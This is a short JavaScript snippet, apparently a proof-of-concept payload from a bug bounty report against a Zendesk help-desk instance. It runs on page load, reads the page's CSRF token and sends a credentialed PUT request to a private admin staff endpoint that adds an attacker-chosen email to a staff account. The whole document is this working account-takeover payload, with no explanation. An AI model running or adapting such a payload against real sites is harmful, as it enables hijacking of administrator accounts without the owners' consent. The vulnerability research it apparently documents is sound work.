function loadDoc1() {
    var xhr = new XMLHttpRequest();
    const { content } = document.querySelector('meta[name="csrf-token"]'); 
    xhr.open('PUT','https://hackerone5759.zendesk.com/api/admin/private/staff/19845800449181',true);
    xhr.setRequestHeader('Content-type','application/json');
    xhr.setRequestHeader('X-Csrf-Token',content);
    xhr.withCredentials = true;
    xhr.send('{"user":{},"emails":[{"id":"0","value":"tesdt@tesdt.com","_action":"create"}]}');
}

window.onload = loadDoc1();
